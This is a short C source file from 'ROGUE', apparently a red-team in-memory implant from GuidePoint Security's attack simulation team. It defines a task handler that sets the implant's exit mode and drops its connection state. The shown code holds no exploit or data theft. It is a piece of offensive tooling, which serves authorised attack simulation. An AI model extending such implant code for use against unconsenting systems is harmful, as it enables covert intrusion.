/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct __attribute__(( packed ))
{
	UINT32	ExitMode;
} ROGUE_TASK_REQ_EXIT, *PROGUE_TASK_REQ_EXIT ;

/*!
 *
 * Purpose:
 *
 * Controls how rogue exits from memory.
 *
!*/
D_SEC( B ) BOOLEAN CtlExit( _In_ PROGUE_CTX Context, _In_ PVOID Buffer, _In_ UINT32 Length, _Out_ PBUFFER Output )
{
	BOOLEAN			Ret = FALSE;
	PROGUE_TASK_REQ_EXIT	Rtq = NULL;

	/* Did we recieve invalid parameters */
	if ( ! Buffer || ! Length || Length != sizeof( ROGUE_TASK_REQ_EXIT ) ) {

		/* Set the last error: Invalid parameters passed in */
		NtCurrentTeb()->LastErrorValue = STATUS_INVALID_PARAMETER;

		/* Abort! No output */
		return FALSE;
	};

	/* Set the output parameter */
	Rtq = C_PTR( Buffer ); 

	/* Set the new exit mode */
	Context->Config.ExitMode = Rtq->ExitMode;

	/* Set the established connection */
	Context->Established = FALSE;

	/* No output */
	return TRUE;
};
